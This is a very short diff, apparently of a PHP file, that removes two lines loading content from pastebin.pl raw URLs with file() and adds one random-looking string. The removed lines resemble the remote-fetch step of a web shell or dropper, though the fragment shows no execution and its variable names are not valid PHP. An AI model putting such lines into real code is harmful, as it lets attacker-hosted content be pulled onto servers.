@@ -1,2 +1,1 @@
-$2  = file('https://pastebin.pl/view/raw/7a70869e'); 
-$3  = file('https://pastebin.pl/view/raw/04ff7279'); 
+lOeQwg5R
